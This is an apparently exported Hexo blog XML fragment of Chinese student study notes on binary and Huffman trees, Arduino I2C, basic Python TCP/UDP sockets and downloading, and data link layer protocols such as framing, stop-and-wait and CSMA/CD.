    <link href="/2023/11/05/%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E9%9A%8F%E8%AE%B0/"/>
    <url>/2023/11/05/%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E9%9A%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="树"><a href="#树" class="headerlink" title="树"></a>树</h1><h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><ol><li><p>二叉树每一层最多的节点数为</p><p>2^n-1^</p></li><li><p>满二叉树</p><p>一颗树的层数为k那么他的总的节点是</p><p>2^k-1^</p></li><li><p>完全二叉树</p><p>编号与满二叉树的编号相等</p><p>先左后右</p></li><li><p>任何一棵二叉树，度为2的节点数总是比叶子节点数少1</p></li><li><p>分支节点是非叶子节点</p></li><li><p>对于满二叉树来说<br>满二叉树的一个重要性质是叶节点的数量（m）总是比分枝节点的数量（k）多1</p></li><li><p>完全二叉树当中</p><p>左节点是2i</p><p>右节点是2i+1</p></li><li><p>含有n个结点的二叉树采用二叉链表存储时，空指针域的个数为 n+1</p></li><li><p>将一颗树转化为二叉树，根结点没有右子树。</p></li><li><p>二叉树有5种形态</p></li></ol><h2 id="哈夫曼树"><a href="#哈夫曼树" class="headerlink" title="哈夫曼树"></a>哈夫曼树</h2><ol><li><p>对于一棵有n个叶子节点的哈夫曼树，它的节点总数是2n-1。</p></li><li><p>哈夫曼树的构建过程是基于权值的：权值较小的节点离根节点较远，权值较大的节点离根节点较近。</p></li><li><p>从上往下</p><p>左为0，右边为1</p></li><li><p>将一棵树T转换为一颗二叉树T2，则T的先序遍历是T2的<strong>先序</strong></p></li><li><p>将一棵树T转换为一颗二叉树T2，则T的后序遍历是T2的<strong>中序</strong></p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python进阶</title>
    <link href="/2023/11/04/python/python%E8%BF%9B%E9%98%B6/"/>
    <url>/2023/11/04/python/python%E8%BF%9B%E9%98%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="知识点补充"><a href="#知识点补充" class="headerlink" title="知识点补充"></a>知识点补充</h1><h2 id="生成式"><a href="#生成式" class="headerlink" title="生成式"></a>生成式</h2>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>arduino_wire</title>
    <link href="/2023/10/30/others/arduino-wire/"/>
    <url>/2023/10/30/others/arduino-wire/</url>
    
    <content type="html"><![CDATA[<p>某个项目的需要学习一下</p><h1 id="l2C协议的简述"><a href="#l2C协议的简述" class="headerlink" title="l2C协议的简述"></a>l2C协议的简述</h1><ol><li>半双工通信</li><li>通信只能由主设备发起，并由主设备主导。从设备按照L2C协议接受数据，并且给出反应</li><li>从设备由唯一的地址，主设备的地址不重要</li></ol><h1 id="Wire库的使用"><a href="#Wire库的使用" class="headerlink" title="Wire库的使用"></a>Wire库的使用</h1><ol><li>头文件Wrie.h</li><li>注意从设备加入到总线里面的时候要指明地址</li></ol><h2 id="begin"><a href="#begin" class="headerlink" title="begin()"></a>begin()</h2><ol><li>加入到总线当中</li></ol><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20231030202545529.png" alt="image-20231030202545529"></p><ul><li><p>作为从机添加的是1，4参数的</p><p>作为主机添加的是0,2,3,参数的、</p></li></ul><h2 id="开始和结束传输"><a href="#开始和结束传输" class="headerlink" title="开始和结束传输"></a>开始和结束传输</h2><ol><li><p>首先指定开始传输</p><p>然后结束传输</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20231030203442609.png" alt="image-20231030203442609"></p><p>当endTranslation()的返回值是0，就说明有这个主机</p></li></ol><h2 id="传输数据"><a href="#传输数据" class="headerlink" title="传输数据"></a>传输数据</h2><ol><li><p>使用的是write()函数</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20231030203744677.png" alt="image-20231030203744677"></p></li></ol><h2 id="请求数据"><a href="#请求数据" class="headerlink" title="请求数据"></a>请求数据</h2><ol><li><p>需要先请求</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20231030203921876.png" alt="image-20231030203921876"></p></li><li><p>然后使用avalible()检查是否有数据可以读取</p></li><li><p>read函数</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20231030204123652.png" alt="image-20231030204123652"></p></li></ol><h2 id="从机注册相关的事件"><a href="#从机注册相关的事件" class="headerlink" title="从机注册相关的事件"></a>从机注册相关的事件</h2>]]></content>
    
    
    
    <tags>
      
      <tag>others</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网络编程</title>
    <link href="/2023/10/30/python/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    <url>/2023/10/30/python/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="requests库"><a href="#requests库" class="headerlink" title="requests库"></a>requests库</h1><ol><li><p>使用python 下载图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Download</span>(<span class="hljs-title class_ inherited__">Thread</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, url</span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br>        self.__url = url<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        fileName = self.__url[self.__url.rfind(<span class="hljs-string">&#x27;/&#x27;</span>)+<span class="hljs-number">1</span>:] <span class="hljs-comment"># 获取文件名，从左一个/开始后面的</span><br>        resp = requests.get(self.__url)<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(fileName, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(resp.content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    Download(<span class="hljs-string">r&quot;https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/y/%E5%A3%81%E7%BA%B8.png&quot;</span>).start()<br><br><br>main()<br></code></pre></td></tr></table></figure></li></ol><h1 id="TCP套接字"><a href="#TCP套接字" class="headerlink" title="TCP套接字"></a>TCP套接字</h1><h2 id="套接字的分类"><a href="#套接字的分类" class="headerlink" title="套接字的分类"></a>套接字的分类</h2><ol><li>TCP套接字（流套接字）</li><li>数据报套接字</li><li>原始套接字</li></ol><h2 id="TCP套接字-1"><a href="#TCP套接字-1" class="headerlink" title="TCP套接字"></a>TCP套接字</h2><ol><li><p>端口</p><p>1024一下的是著名服务端口</p></li></ol><h2 id="多并发通信"><a href="#多并发通信" class="headerlink" title="多并发通信"></a>多并发通信</h2><p>server.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> http <span class="hljs-keyword">import</span> server<br><span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> socket,SOCK_STREAM,AF_INET<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">from</span> numpy <span class="hljs-keyword">import</span> add<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.server=socket(family=AF_INET,<span class="hljs-built_in">type</span>=SOCK_STREAM)<br>        self.server.bind((<span class="hljs-string">&#x27;192.168.211.195&#x27;</span>,<span class="hljs-number">35555</span>))<br>        self.server.listen(<span class="hljs-number">512</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;begin.....&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">server_connet</span>(<span class="hljs-params">self</span>):<br>        num=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            client,addr=self.server.accept()<br>            num+=<span class="hljs-number">1</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;现在有<span class="hljs-subst">&#123;num&#125;</span>个client&quot;</span>)<br>            Thread(target=self.client_session,args=(client,addr))<br>         <br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">client_session</span>(<span class="hljs-params">self,client: socket,addr</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;addr&#125;</span>  连接到服务器&quot;</span>)<br>        recv_message=client.recv(<span class="hljs-number">1024</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;client<span class="hljs-subst">&#123;client&#125;</span> time :<span class="hljs-subst">&#123;datetime.now()&#125;</span> 发来一条信息:<span class="hljs-subst">&#123;recv_message&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    server=Server()<br>    server.server_connet()<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br>    <br>   <br></code></pre></td></tr></table></figure><p>client.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> socket,SOCK_STREAM,AF_INET<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">client</span>():<br>    client=socket()<br>    client.connect((<span class="hljs-string">&quot;192.168.211.195&quot;</span>,<span class="hljs-number">35555</span>))<br>    send_message=<span class="hljs-string">f&quot;august nihao!&quot;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    client.send(send_message)<br>    client.close()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">50</span>):<br>    client()<br>    sleep(<span class="hljs-number">1</span>)<br><br></code></pre></td></tr></table></figure><h1 id="UDP-套接字"><a href="#UDP-套接字" class="headerlink" title="UDP 套接字"></a>UDP 套接字</h1><p>UDP无需建立连接就可以发送信息</p><p>并且直需要在开启socket的时候使用不同的网络流就可以了</p><p>udp是SOCK_DGRAM</p><p>然后发送数据使用sendto()</p><p>接收信息使用recvfrom()</p><p>client</p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据链路层</title>
    <link href="/2023/10/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/"/>
    <url>/2023/10/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/</url>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="数据链路层的地位"><a href="#数据链路层的地位" class="headerlink" title="数据链路层的地位"></a>数据链路层的地位</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231025103310175.png" alt="image-20231025103310175"></p><ol><li><p>链路</p><p>从一个结点到另一个相邻结点，中间没有其他的交换结点</p></li><li><p>数据链路</p><p>在链路上添加了协议和软件，就跟构成了数据链路</p></li><li><p>数据链路层通过<strong>帧</strong>来传递数据</p></li></ol><h2 id="数据链路层的三个重要问题"><a href="#数据链路层的三个重要问题" class="headerlink" title="数据链路层的三个重要问题"></a>数据链路层的三个重要问题</h2><h3 id="封装成帧"><a href="#封装成帧" class="headerlink" title="封装成帧"></a>封装成帧</h3><p>需要在来自网络层的数据添加，帧头和帧尾，这个过程就是封装成帧的过程</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231025103913366.png" alt="image-20231025103913366"></p><h3 id="差错检测"><a href="#差错检测" class="headerlink" title="差错检测"></a>差错检测</h3><p> 每一个帧具有帧检验字段</p><p>通过算法查看是否有出错</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231025104213045.png" alt="image-20231025104213045"></p><h3 id="可靠传输"><a href="#可靠传输" class="headerlink" title="可靠传输"></a>可靠传输</h3><p>如果传输的过程中出现了错误，就会被丢弃</p><p>如果发送方提供的是不可靠服务，丢弃就丢弃了。如果是可靠服务，就需要保证上层能过接收到真正确的副本</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231025104521813.png" alt="image-20231025104521813"></p><h1 id="封装成帧-1"><a href="#封装成帧-1" class="headerlink" title="封装成帧"></a>封装成帧</h1><p>添加帧头和帧尾的过程</p><p>帧头和帧尾的作用之一是帧定界</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231025105011257.png" alt="image-20231025105011257"></p><p>通过帧的标志位来划分</p><p>但是不是所有的帧都包含标志位</p><p>比如像mac帧，就存在标志位，那是怎么定位的呢？</p><blockquote><ol><li><p>通过前导码</p><p>前导码里面包含了8字节，前7个字节是前同步码，是接收方的时钟同步</p><p>后一个字节是帧开始定界符</p></li><li><p>规定了96比特的发送时间，所有mac帧不需要帧结束定位符</p></li></ol></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231025105610036.png" alt="image-20231025105610036"></p><h2 id="透明传输"><a href="#透明传输" class="headerlink" title="透明传输"></a>透明传输</h2><ol><li><p>数据链路层对上层传输的数据没有任何限制</p><p>问题：如果上层传输的数据中存在flag的值，那就不能正常传输</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231025110036815.png" alt="image-20231025110036815"></p><blockquote><p>因此存在各种数据链路层协议，为解决这个问题</p><p>可以这样，当上层数据传入数据链路层的时候，数据链路层会扫描发送的数据，如果存在数据定位符，我们就对非flag转义</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231025110406127.png" alt="image-20231025110406127"></p><p>但是现在有一个新的问题：</p><p>如果存在转移字符，怎么解决？</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231025110519536.png" alt="image-20231025110519536"></p><blockquote><p>将改转义字符也转义变成普通的字符</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231025110611230.png" alt="image-20231025110611230"></p></li><li><p>数据部分的长度</p><p>考虑到差错控制等多种因素，每一种数据链路层的协议都规定了<strong>最大传送单元MTU</strong></p></li></ol><h1 id="差错检验"><a href="#差错检验" class="headerlink" title="差错检验"></a>差错检验</h1><h2 id="奇偶校验"><a href="#奇偶校验" class="headerlink" title="奇偶校验"></a>奇偶校验</h2><p>在待发送的数据后面添加一位奇偶校验位，使得整个数据当中’1’的个数为奇数或者偶数</p><blockquote><p>采取这样的检测会出现问题，当发生一位误码的时候可以检测出。但是当产生两位误码的时候就可能会误认为没有发生改变</p></blockquote><h2 id="冗余码检验"><a href="#冗余码检验" class="headerlink" title="冗余码检验"></a>冗余码检验</h2><p>主要使用</p><h1 id="可靠传输-1"><a href="#可靠传输-1" class="headerlink" title="可靠传输"></a>可靠传输</h1><h2 id="传输差错"><a href="#传输差错" class="headerlink" title="传输差错"></a>传输差错</h2><ol><li>比特差错</li><li>分组丢失</li><li>分组失序</li><li>分组重复</li><li>分组丢失，分组失序，分组重复不会存在于数据链路层，只会出现在上层</li></ol><h1 id="可靠传输的协议"><a href="#可靠传输的协议" class="headerlink" title="可靠传输的协议"></a>可靠传输的协议</h1><h2 id="停止等待协议"><a href="#停止等待协议" class="headerlink" title="停止等待协议"></a>停止等待协议</h2><blockquote><p>基本实现：</p><p>发送方发发送数据然后接收方检测，如果没有误码就给发送方发送ACK，发送方就可以继续发送数据。如果存在误码就会发送NAK，然后发送方就会重新发送数据</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231025115733560.png" alt="image-20231025115733560"></p><p><strong>超时重传</strong></p><p>还有一种情况，假设现在传数据，但是丢失了，也就是说接收方完全没有接收到，这种情况下，就需要<strong>超时重传</strong>了</p><p>发送方设定了一个超时时间，从发送方发送开始计时，如果超过了这个时间接收方还没有发来ACK或者NAK就需要重发数据</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231030141158181.png" alt="image-20231030141158181"></p><p><strong>确认丢失</strong></p><p>当ack丢失的时候，我们采取对数据编号的方法，这这种情况下我们只需要一比特（0，1）的方法做标记。当ack丢失的时候，发送方会再次发送这个包。接收方会通过序号检查发现是重复的包，就只会发一个确认，并将此包丢弃</p><p><strong>确认迟到</strong></p><p>当ack迟到的时候，接收方会误认为此包丢失了，所以这个是发送方有重新发送此包。但是发送完毕之后，接收到了ack，发送方又会发送一下包，这个时候接收方收到了发送方发来的第一个包，所以会发送ack。当ack传入到接收方的时候会误认为是第二个包的。这样就会出现冲突，所以我们需要对ack也进行编号</p><p>虽然此协议可以有效的防止数据丢失，但是信道利用率会非常的低</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231030143347874.png" alt="image-20231030143347874"></p><h2 id="回退N帧协议的GBN（滑动窗口协议）"><a href="#回退N帧协议的GBN（滑动窗口协议）" class="headerlink" title="回退N帧协议的GBN（滑动窗口协议）"></a>回退N帧协议的GBN（滑动窗口协议）</h2><p> <img src="D:\hexo\source_posts\计算机网络\数据链路层.assets\image-20231030144135604.png" alt="image-20231030144135604"></p><p><strong>重点：</strong></p><ol><li>取帧的大小要根据约定</li><li>如果网络信号不好，信道利用率也很低</li></ol><h2 id="选择重传协议"><a href="#选择重传协议" class="headerlink" title="选择重传协议"></a>选择重传协议</h2><h1 id="点对点协议（ppp协议）"><a href="#点对点协议（ppp协议）" class="headerlink" title="点对点协议（ppp协议）"></a>点对点协议（ppp协议）</h1><p>​     <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231030150735902.png" alt="image-20231030150735902"></p><h2 id="透明传输-1"><a href="#透明传输-1" class="headerlink" title="透明传输"></a>透明传输</h2><ol><li><p>当在帧的数据部分遇到了标识符的时候有两种做法</p><ul><li>面向字节的异步链路</li><li>面向比特的同步链路</li></ul><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231030150932832.png" alt="image-20231030150932832"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231030151024198.png" alt="image-20231030151024198"></p></li></ol><h2 id="工作状态"><a href="#工作状态" class="headerlink" title="工作状态"></a>工作状态</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231030151024198.png" alt="image-20231030151024198"></p><h1 id="媒体接入控制的基本概念"><a href="#媒体接入控制的基本概念" class="headerlink" title="媒体接入控制的基本概念"></a>媒体接入控制的基本概念</h1><h2 id="共享信道"><a href="#共享信道" class="headerlink" title="共享信道"></a>共享信道</h2><ol><li>当使用总线传输的时候，需要协调多个发送和接受使用同一个共享媒体的占用，即媒体控制mac</li></ol><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231030151944904.png" alt="image-20231030151944904"></p><h2 id="信道复用"><a href="#信道复用" class="headerlink" title="信道复用"></a>信道复用</h2><h3 id="频分复用"><a href="#频分复用" class="headerlink" title="频分复用"></a>频分复用</h3><p>所有的用户占用不同的频段资源并行通信</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231030152207282.png" alt="image-20231030152207282"></p><h3 id="时分复用"><a href="#时分复用" class="headerlink" title="时分复用"></a>时分复用</h3><p>所有的用户通过时间间隙复用</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231030152337706.png" alt="image-20231030152337706"></p><h3 id="波分复用"><a href="#波分复用" class="headerlink" title="波分复用"></a>波分复用</h3><p>可以理解为光的频分复用</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231030152509687.png" alt="image-20231030152509687"></p><h3 id="码分复用"><a href="#码分复用" class="headerlink" title="码分复用"></a>码分复用</h3><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231030152628597.png" alt="image-20231030152628597"></p><h2 id="动态接入-随机接入（CSMA-x2F-CD协议）"><a href="#动态接入-随机接入（CSMA-x2F-CD协议）" class="headerlink" title="动态接入-随机接入（CSMA&#x2F;CD协议）"></a>动态接入-随机接入（CSMA&#x2F;CD协议）</h2><p>发送流程图</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231101104026847.png" alt="image-20231101104026847"></p><p>接受流程图</p><h3 id="多址接入"><a href="#多址接入" class="headerlink" title="多址接入"></a><img src="/" alt="image-20231101104115688">多址接入</h3><p> 多个站点接入到一个总线上</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231101103050893.png" alt="image-20231101103050893"></p><h3 id="载波监听"><a href="#载波监听" class="headerlink" title="载波监听"></a>载波监听</h3><p>每一个站点在发送帧之前先检查一下总线上是否存在空闲的96比特的时间，如果是忙的话就继续监听</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231101103222579.png" alt="image-20231101103222579"></p><h3 id="碰撞检测"><a href="#碰撞检测" class="headerlink" title="碰撞检测"></a>碰撞检测</h3><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231101103239455.png" alt="image-20231101103239455"></p><h3 id="争用期"><a href="#争用期" class="headerlink" title="争用期"></a>争用期</h3><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231101103520069.png" alt="image-20231101103520069"></p><h1 id="CSMA-x2F-CA协议"><a href="#CSMA-x2F-CA协议" class="headerlink" title="CSMA&#x2F;CA协议"></a>CSMA&#x2F;CA协议</h1><h2 id="信道预约"><a href="#信道预约" class="headerlink" title="信道预约"></a>信道预约</h2><h2 id="虚拟载波监听"><a href="#虚拟载波监听" class="headerlink" title="虚拟载波监听"></a>虚拟载波监听</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231101110820915.png" alt="image-20231101110820915"></p><h1 id="MAC地址，IP地址，ARP协议"><a href="#MAC地址，IP地址，ARP协议" class="headerlink" title="MAC地址，IP地址，ARP协议"></a>MAC地址，IP地址，ARP协议</h1><blockquote><p>MAC地址是数据链路层的协议</p><p>IP地址，ARP地址是网际层的协议</p></blockquote><h2 id="MAC地址"><a href="#MAC地址" class="headerlink" title="MAC地址"></a>MAC地址</h2><ol><li><p>存储在eeprom中，所以也称MAC地址为硬件地址</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231101112241231.png" alt="image-20231101112241231"></p><p>但是MAC地址不是物理层的地址，而是数据链路层 </p></li><li><p>分类</p><p>根据第一位字节的b1位和第一字节的b0位，一共有4种MAC地址</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231101113002463.png" alt="image-20231101113002463"></p></li><li><p>发送顺序</p><p>字节的发送是顺序</p><p>字节内的发送时逆序</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231101113121633.png" alt="image-20231101113121633"></p></li><li><p>多播MAC地址</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231101113410095.png" alt="image-20231101113410095"></p><p>判断是否是多播地址，根据第一个字节的十六进制是否能整除2，不能则为多播。能就是单播地址</p></li></ol><h2 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h2><p> <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231101113837171.png" alt="image-20231101113837171"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231101113959921.png" 